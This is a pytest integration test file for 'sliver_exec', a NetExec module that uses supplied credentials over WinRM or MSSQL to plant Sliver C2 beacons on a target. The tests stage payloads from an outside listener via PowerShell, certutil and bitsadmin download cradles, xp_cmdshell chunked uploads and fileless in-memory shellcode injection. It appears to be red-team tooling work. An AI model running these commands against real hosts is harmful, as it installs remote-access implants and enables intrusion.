"""
Integration tests for sliver_exec module against real targets.

These tests require:
- Sliver server running (v1.6+)
- Valid Sliver client configuration (~/.sliver-client/configs/default.cfg)
- Test target accessible (Windows/Linux with valid credentials)
- NetExec installed (netexec or nxc command available)
- sliver_exec module installed in NetExec (run install script first)

IMPORTANT: Before running integration tests, install the module:
   cd /workspaces/sliver-nxc-module
   sudo cp src/nxc/modules/sliver_exec.py /usr/local/lib/python3.12/site-packages/nxc/modules/
   sudo cp -r src/sliver /usr/local/lib/python3.12/site-packages/

Run with: pytest tests/test_integration.py -v --run-integration

Environment variables (required):
- TARGET_HOST: Target IP address
- TARGET_USER: Target username
- TARGET_PASS: Target password
- SLIVER_LISTENER_HOST: Sliver listener IP address
- SLIVER_LISTENER_PORT: Sliver mTLS port (default: 8888)
- SLIVER_HTTP_STAGING_PORT: HTTP staging port (default: 8080)
"""
import os
import pytest
import subprocess
import shutil
from pathlib import Path


# Integration test marker
pytestmark = pytest.mark.integration


# Configuration from environment (required)
TARGET_HOST = os.getenv("TARGET_HOST")
TARGET_USER = os.getenv("TARGET_USER")
TARGET_PASS = os.getenv("TARGET_PASS")
LISTENER_HOST = os.getenv("SLIVER_LISTENER_HOST")
LISTENER_PORT = os.getenv("SLIVER_LISTENER_PORT", "8888")
HTTP_STAGING_PORT = os.getenv("SLIVER_HTTP_STAGING_PORT", "8080")
SLIVER_CONFIG = os.path.expanduser("~/.sliver-client/configs/default.cfg")

# Find netexec binary
NETEXEC_BIN = shutil.which("netexec") or shutil.which("nxc")


def _validate_env() -> None:
    """Validate required environment variables are set."""
    missing = []
    if not TARGET_HOST:
        missing.append("TARGET_HOST")
    if not TARGET_USER:
        missing.append("TARGET_USER")
    if not TARGET_PASS:  missing.append("TARGET_PASS")
    if not LISTENER_HOST:
        missing.append("SLIVER_LISTENER_HOST")
    
    if missing:
        raise RuntimeError(
            f"Required environment variables not set: {', '.join(missing)}\n"
            "Set these variables before running integration tests."
        )


@pytest.fixture(scope="module")
def check_prerequisites():
    """Check that all prerequisites are met before running integration tests."""
    errors = []
    
    required_env_vars = {
        "TARGET_HOST": TARGET_HOST,
        "TARGET_USER": TARGET_USER,
        "TARGET_PASS": TARGET_PASS,
        "SLIVER_LISTENER_HOST": LISTENER_HOST,
    }
    
    for var_name, var_value in required_env_vars.items():
        if not var_value:
            errors.append(f"Required environment variable {var_name} is not set")
    
    if errors:
        pytest.skip(f"Prerequisites not met: {'; '.join(errors)}")
    
    # Check Sliver config exists
    if not Path(SLIVER_CONFIG).exists():
        errors.append(f"Sliver config not found: {SLIVER_CONFIG}")
    
    # Check netexec is available
    if not NETEXEC_BIN:
        errors.append("netexec/nxc command not found in PATH")
    else:
        try:
            result = subprocess.run(
                [NETEXEC_BIN, "--help"],
                capture_output=True,
                timeout=5
            )
            if result.returncode != 0:
                errors.append(f"netexec binary at {NETEXEC_BIN} is not working")
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            errors.append(f"netexec command failed: {e}")
        
        try:
            result = subprocess.run(
                [NETEXEC_BIN, "smb", "-L"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if "sliver_exec" not in result.stdout:
                errors.append(
                    "sliver_exec module not found in netexec. "
                    "Install it first: sudo cp src/nxc/modules/sliver_exec.py /usr/local/lib/python3.12/site-packages/nxc/modules/ "
                    "&& sudo cp -r src/sliver /usr/local/lib/python3.12/site-packages/"
                )
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            errors.append(f"Failed to check netexec modules: {e}")
    
    if TARGET_HOST:
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "2", TARGET_HOST],
                capture_output=True,
                timeout=5
            )
            if result.returncode != 0:
                errors.append(f"Target {TARGET_HOST} is not reachable")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            errors.append(f"Cannot ping target {TARGET_HOST}")
    
    if errors:
        pytest.skip(f"Prerequisites not met: {'; '.join(errors)}")
    
    return True


@pytest.fixture
def sliver_cleanup():
    """Fixture to clean up Sliver beacons/sessions after each test."""
    yield
    
    # Cleanup: Kill any beacons created during test
    # This is best-effort - if it fails, don't block the test
    try:
        # TODO: Could use sliver-py to enumerate and kill beacons
        # For now, manual cleanup expected between test runs
        pass
    except Exception:
        pass


class TestIntegrationDirectUpload:
    
    def test_direct_upload_winrm_windows(self, check_prerequisites, sliver_cleanup):
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"Direct upload failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        assert "Generating unique Sliver beacon" in result.stdout
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
        
        assert "HTTP listener" not in result.stdout
        assert "download cradle" not in result.stdout


class TestIntegrationHTTPStaging:
    
    def test_http_staging_powershell_windows(self, check_prerequisites, sliver_cleanup):
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "STAGING=download",
                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
                "DOWNLOAD_TOOL=powershell",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"HTTP staging (PowerShell) failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        assert "Starting HTTP listener" in result.stdout
        assert "download cradle" in result.stdout
        assert "PowerShell" in result.stdout or "powershell" in result.stdout
        assert "Payload size:" in result.stdout
        
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
    
    def test_http_staging_certutil_windows(self, check_prerequisites, sliver_cleanup):
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "STAGING=download",
                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
                "DOWNLOAD_TOOL=certutil",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"HTTP staging (certutil) failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        assert "Starting HTTP listener" in result.stdout
        assert "certutil" in result.stdout
        assert "Payload size:" in result.stdout
    
    def test_http_staging_bitsadmin_windows(self, check_prerequisites, sliver_cleanup):
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "STAGING=download",
                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
                "DOWNLOAD_TOOL=bitsadmin",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"HTTP staging (bitsadmin) failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        assert "Starting HTTP listener" in result.stdout
        assert "bitsadmin" in result.stdout
        assert "Payload size:" in result.stdout


class TestIntegrationMSSQLStaging:
    """Integration tests for MSSQL HTTP staging (default behavior)."""
    
    def test_mssql_http_staging_default_certutil(self, check_prerequisites, sliver_cleanup):
        """Test MSSQL defaults to HTTP staging with certutil."""
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "mssql",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"MSSQL HTTP staging (default) failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        # Verify HTTP staging was used (default behavior)
        assert "Starting HTTP listener" in result.stdout or "HTTP download staging" in result.stdout
        assert "certutil" in result.stdout.lower()
        assert "Payload size:" in result.stdout
        
        # Verify beacon callback
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
    
    def test_mssql_staging_direct_chunked_upload(self, check_prerequisites, sliver_cleanup):
        """Test MSSQL with STAGING=none uses chunked upload (old behavior)."""
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "mssql",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "STAGING=none",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"MSSQL STAGING=none failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        # Verify chunked upload was used (NOT HTTP staging)
        assert "HTTP listener" not in result.stdout
        assert "download cradle" not in result.stdout
        assert "chunked" in result.stdout.lower() or "xp_cmdshell" in result.stdout.lower()
        
        # Verify beacon callback
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
    
    def test_mssql_http_staging_with_powershell_override(self, check_prerequisites, sliver_cleanup):
        """Test MSSQL HTTP staging with PowerShell download tool override."""
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "mssql",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "DOWNLOAD_TOOL=powershell",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"MSSQL HTTP staging (PowerShell) failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        # Verify PowerShell was used instead of certutil
        assert "Starting HTTP listener" in result.stdout or "HTTP download staging" in result.stdout
        assert "powershell" in result.stdout.lower()
        
        # Verify beacon callback
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout


class TestIntegrationEdgeCases:
    
    def test_invalid_credentials(self, check_prerequisites):
        assert TARGET_HOST and LISTENER_HOST and NETEXEC_BIN
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", "invalid_user",
                "-p", "invalid_pass",
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}"
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        
        assert "Failed" in result.stdout or result.returncode != 0 or "denied" in result.stdout.lower()
    
    def test_fileless_shellcode_staging_winrm(self, check_prerequisites, sliver_cleanup):
        """Test fileless TCP/HTTP shellcode injection staging (advanced mode).
        
        This triggers shellcode staging by setting STAGING=download without HTTP_STAGING_PORT.
        The bootstrap downloads shellcode from a stager listener and executes in memory.
        
        This test verifies the fix for the 17MB payload issue:
        - Old approach: Sent 17MB shellcode directly → exceeded WinRM 150KB limit
        - New approach: Sends 2KB bootstrap → downloads 17MB from stager listener
        """
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        
        result = subprocess.run(
            [
                NETEXEC_BIN, "winrm",
                TARGET_HOST,
                "-u", TARGET_USER,
                "-p", TARGET_PASS,
                "-M", "sliver_exec",
                "-o", f"RHOST={LISTENER_HOST}",
                f"RPORT={LISTENER_PORT}",
                "STAGING=download",
                "SHELLCODE_PROTOCOL=http",
                f"SHELLCODE_LISTENER_HOST={LISTENER_HOST}",
                "SHELLCODE_LISTENER_PORT=9999",
                "WAIT=120",
                "CLEANUP=True"
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )
        
        assert result.returncode == 0, (
            f"Fileless staging failed:\n"
            f"STDOUT:\n{result.stdout}\n"
            f"STDERR:\n{result.stderr}"
        )
        
        assert "Generating tiny HTTP bootstrap stager" in result.stdout
        assert "Started HTTP stager listener" in result.stdout or "Started TCP stager listener" in result.stdout
        assert "Started mTLS C2 listener" in result.stdout
        assert "Bootstrap stager injected" in result.stdout
        assert "Bootstrap payload size:" in result.stdout
        
        stdout_lower = result.stdout.lower()
        assert "2716" in result.stdout or "bytes" in stdout_lower
        
        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
    
    @pytest.mark.skip(reason="Requires Linux target - implement when available")
    def test_http_staging_linux_wget(self, check_prerequisites, sliver_cleanup):
        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
        pass
